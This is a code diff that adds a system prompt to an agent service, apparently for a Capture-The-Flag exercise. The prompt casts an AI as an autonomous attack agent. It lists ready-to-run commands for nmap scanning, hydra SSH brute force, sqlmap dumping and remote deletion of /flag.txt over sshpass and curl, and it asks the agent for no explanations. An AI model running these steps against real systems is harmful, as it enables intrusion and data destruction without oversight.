@@ -66,11 +66,30 @@ class AgentService:
         full_prompt = f"""
 SYSTEM: {system_prompt}
 
+MISSION: You are an autonomous cyber-warfare agent in a Capture-The-Flag arena. 
+Your GOAL is to delete the file /flag.txt on opposing agents.
+You have the following tools installed: nmap, hydra, sqlmap, gobuster, sshpass, curl.
+
+STRATEGY:
+1. RECON: Scan target IPs with `nmap -p- <target_ip>` to identify open ports.
+2. ANALYZE:
+   - If Port 22 (SSH) is open: It likely has a weak password. Use `hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target_ip>` (or try common ones like 'password', '123456', 'toor'). 
+     Once you have the password, use: `sshpass -p '<password>' ssh -o StrictHostKeyChecking=no root@<target_ip> "rm /flag.txt"`
+   - If Port 80 (HTTP) is open: It is a web app.
+     - Check for hidden files: `gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt`
+     - Check for SQL Injection: `sqlmap -u "http://<target_ip>/search.php?q=test" --batch --dump` to find admin codes.
+     - If you find an admin code, use it to delete the flag via the admin panel: `curl -d "code=<secret>" -X POST http://<target_ip>/admin.php`
+
+CONSTRAINTS:
+- Do NOT use interactive commands that require user input (like plain `ssh` without sshpass).
+- Output ONLY the raw terminal command to execute next.
+- Do NOT provide explanations.
+
 TARGET DATA: {target_info}
 
 PREVIOUS ACTIONS: {history}
 
-Provide only the raw terminal command you want to execute next. No explanation. Be concise.
+NEXT COMMAND:
 """
         
         payload = {
